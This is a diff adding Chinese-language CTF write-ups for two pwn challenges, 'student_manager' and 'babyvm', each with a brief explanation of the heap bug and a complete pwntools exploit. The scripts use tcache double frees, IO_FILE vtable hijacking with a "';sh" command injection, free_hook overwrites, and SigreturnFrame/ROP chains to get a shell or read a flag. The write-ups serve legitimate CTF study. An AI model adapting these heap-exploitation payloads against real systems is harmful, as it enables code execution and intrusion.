@@ -465,3 +465,260 @@ def exp():
 exp()
 
 ```
+
+## student_manager
+
+### 程序逻辑 && 漏洞利用
+
+这是个cpp的程序，不过还是常规的菜单题，环境是18.04，有double free，hook会自动更新，因此用18.04的IO_FILE攻击。这里的数据结构有点难操作，只能写fd前四个字节，0x18处的8个字节以及0x20处的4个字节。
+
+```c
+00000000 node            struc ; (sizeof=0x28, mappedto_10)
+00000000 score           dq ?
+00000008 field_8         dq ?
+00000010 field_10        dq ?
+00000018 name            dq ?
+00000020 id              dq ?
+00000028 node            ends
+```
+
+先double free来leak处heap低四字节，劫持到tcache_perthread_struct的0x30处修改name上方的sz为0xb1，之前将count改为0xff，劫持到name这里释放从而leak出libc地址。
+
+之后劫持tcache_bins[0x30]的值到_IO_2_1_stdout_的fp+0xe8，改为system，劫持fp+0xd8的vtable到_IO_str_jumps-0x28，最后add的时候使用一个shell注入语句触发system("sh")。之前的操作是把_IO_buf_end改成binsh的地址，这里直接在输入的时候触发调用，因为最后的fflush的参数就是输入缓冲区的地址。
+
+### exp.py
+
+```py
+#coding=utf-8
+from pwn import *
+
+r = lambda p:p.recv()
+rl = lambda p:p.recvline()
+ru = lambda p,x:p.recvuntil(x)
+rn = lambda p,x:p.recvn(x)
+rud = lambda p,x:p.recvuntil(x,drop=True)
+s = lambda p,x:p.send(x)
+sl = lambda p,x:p.sendline(x)
+sla = lambda p,x,y:p.sendlineafter(x,y)
+sa = lambda p,x,y:p.sendafter(x,y)
+
+context.update(arch='amd64',os='linux',log_level='DEBUG')
+context.terminal = ['tmux','split','-h']
+debug = 1
+elf = ELF('./student_manager')
+libc_offset = 0x3c4b20
+gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
+if debug:
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    p = process('./student_manager')
+else:
+    libc = ELF('./libc-2.27.so')
+    p = remote('f.buuoj.cn',20173)
+
+def add(id1,score=0x21,name="a"):
+   p.sendlineafter('choice:','1')
+   p.sendlineafter("student's id:",str(id1))
+   p.sendlineafter("student's name:",name)
+   p.sendlineafter("student's score:",str(score))
+
+def show(id1):
+   p.sendlineafter('choice:','2')
+   p.sendlineafter("student's id:",str(id1))
+
+def delete(id1):
+   p.sendlineafter('choice:','3')
+   p.sendlineafter("student's id:",str(id1))
+
+def exp():
+    #leak libc
+    add(0x0)
+    add(0x1)
+    add(2)
+    add(3)
+    add(4)
+    add(5)
+    add(6)
+    add(7)
+    add(28)
+    add(29)
+    add(30)
+    delete(0)
+    delete(1)
+    show(1)
+    p.recvuntil("score:")
+    heap_base = int(p.recvline().strip('\n')) - 0x13290
+    print hex(heap_base)
+    delete(1)
+
+    add(8,heap_base+0x18)
+    add(9)
+    add(10,0xffff)
+    #
+    delete(2)
+    delete(3)
+    delete(3)
+    add(11,heap_base+0x13298)
+    add(12)
+    add(13,0xb1)
+    delete(4)
+    delete(5)
+    delete(5)
+    add(14,heap_base+0x132a0)
+    add(15)
+    add(16)
+    delete(16)
+
+    show(0x61)
+    p.recvuntil("name:")
+    libc_base = u64(p.recvline().strip("\n").ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x10 - 96
+    log.success("libc base => " + hex(libc_base))
+    libc.address = libc_base
+    delete(6)
+    delete(6)
+    delete(7)
+    delete(7)
+    add(17,heap_base+0x40)
+    add(18)
+    add(19,0,p64(libc.sym['_IO_2_1_stdout_']+0xd0)[:-1])
+    add(20,0,p64(libc.sym['system'])[:-1])
+    #add(20,0,p64(libc.address+gadgets[0])[:-1])
+    #print hex(libc_base+gadgets[0])
+    #raw_input()
+    #
+
+    delete(28)
+    delete(28)
+    delete(29)
+    delete(29)
+
+    add(21,heap_base+0x40)
+
+    add(22)
+
+    fake_vtable = libc_base + (0x7ffff7a43360-0x7ffff765b000)
+    add(23,0,p64(libc_base+(0x7ffff7a47838-0x7ffff765b000))[:-1])
+    gdb.attach(p,'b free')
+    fake_vtable = (fake_vtable-0x28) & 0xffffffff
+    print hex(fake_vtable)
+    add(0,(fake_vtable-0x100000000),"';sh")
+
+    p.interactive()
+
+exp()
+
+```
+
+## babyvm
+
+### 程序逻辑 & 漏洞分析
+
+题目模拟了一个vm，开了seccomp只能orw。有几个函数指针，分别是read/write/puts/free。和以往的题目不同，这里开始的code是作者指定的，如果输入的数据比较短就直接结束了。这里先fuzz一下，`1*0x200`打过去发现了错误，查看输入数据(尽量多往后看一点)，可以发现后面有个存储着code最后一次执行的地址，我们用第一次输出的机会leak出heap地址，改一下这个code地址，发现可以执行我们自己的代码，只有一次机会，这里先用0x90的指令把code地址改到堆上，然后就可以拿自定义指令做了。
+
+先拿free把一个大堆块释放了，puts泄露出libc地址，通过修改`v34[1]`两次可以将free_hook改成setcontext+53，输入sigframe再调用free即可。
+
+```
+      case 0x90:
+        v24 = (_QWORD *)v34[3];
+        v34[3] = v24 - 1;
+        v34[5] = *v24;                          // 这里
+        break;
+```
+
+### exp.py
+
+```py
+#coding=utf-8
+from pwn import *
+
+r = lambda p:p.recv()
+rl = lambda p:p.recvline()
+ru = lambda p,x:p.recvuntil(x)
+rn = lambda p,x:p.recvn(x)
+rud = lambda p,x:p.recvuntil(x,drop=True)
+s = lambda p,x:p.send(x)
+sl = lambda p,x:p.sendline(x)
+sla = lambda p,x,y:p.sendlineafter(x,y)
+sa = lambda p,x,y:p.sendafter(x,y)
+
+context.update(arch='amd64',os='linux',log_level='DEBUG')
+context.terminal = ['tmux','split','-h']
+debug = 1
+elf = ELF('./vmpwn')
+libc_offset = 0x3c4b20
+gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
+if debug:
+    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    p = process('./vmpwn')
+else:
+    libc = ELF('./x64_libc.so.6')
+    p = remote('f.buuoj.cn',20173)
+
+def exp():
+    #leak libc
+    p.recvuntil("#tell me what is your name:")
+    payload = "1"*0xf0
+
+    p.send(payload)
+    p.recvuntil(payload)
+
+    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x50
+    log.success("heap base => " + hex(heap_base))
+    p.recvuntil("ok,what do you want to say:")
+    gdb.attach(p,'b* 0x0000555555554000+0x15db')
+    code_addr = heap_base+0x2e80
+    payload = '\x8f'*0x100+p64(code_addr)
+    #leak libc
+    payload += p64(0x90)+p64(heap_base+0x40)
+    payload += chr(0x11)+p64(heap_base+0x50)
+    payload += chr(0x8f)+chr(3)
+    payload += chr(0x8f)+chr(2)
+    #orw
+    #target = heap_base+0x3068
+    target = heap_base+0x10
+    payload += chr(0x11)+p64(0)
+    payload += chr(0x62)+p64(-0x38,sign=True)
+    payload += chr(0x63)+p64(0x200)
+    payload += chr(0x8f)+chr(0x0)
+    payload += chr(0x8f)+chr(0)
+    payload += chr(0x12)+p64(heap_base+0x50)
+    payload += chr(0x8f)+chr(0)
+    payload += chr(0x11)+p64(heap_base+0x58)
+    payload += chr(0x8f)+chr(3)
+
+    payload = payload.ljust(0x300,'a')
+    p.send(payload)
+    p.recvuntil("Now,I recevie your message,bye~\n")
+    libc_base = u64(p.recvline().strip("\n").ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x10 - 88
+    libc.address = libc_base
+    log.success("libc base => " + hex(libc_base))
+    #orw get flag
+    p_rdi = libc_base + 0x0000000000021112
+    p_rsi = libc_base + 0x00000000000202f8
+    p_rdx = libc_base + 0x0000000000001b92
+    p_rax = libc_base + 0x000000000003a738
+    syscall = libc_base + 0x00000000000bc3f5
+    sigframe = SigreturnFrame()
+    sigframe.rdi = heap_base+0x50
+    sigframe.rsi = 0
+    sigframe.rdx = 0
+    sigframe.rax = 2
+    sigframe.rsp = heap_base+0x50+0x100
+    sigframe.rip = libc.sym['open']
+    rop = flat([
+        p_rdi,3,p_rsi,heap_base+0x500,p_rdx,0x30,p_rax,0,syscall,
+        p_rdi,1,p_rsi,heap_base+0x500,p_rdx,0x30,p_rax,1,syscall,
+        ])
+    raw_input()
+    p.send(p64(libc.sym['__free_hook']))
+    raw_input()
+    p.send(p64(libc.sym['setcontext']+53))
+    payload = "./flag\x00\x00"
+    payload += str(sigframe)
+    payload += rop
+    raw_input()
+    p.send(payload)
+    p.interactive()
+
+exp()
+
+```
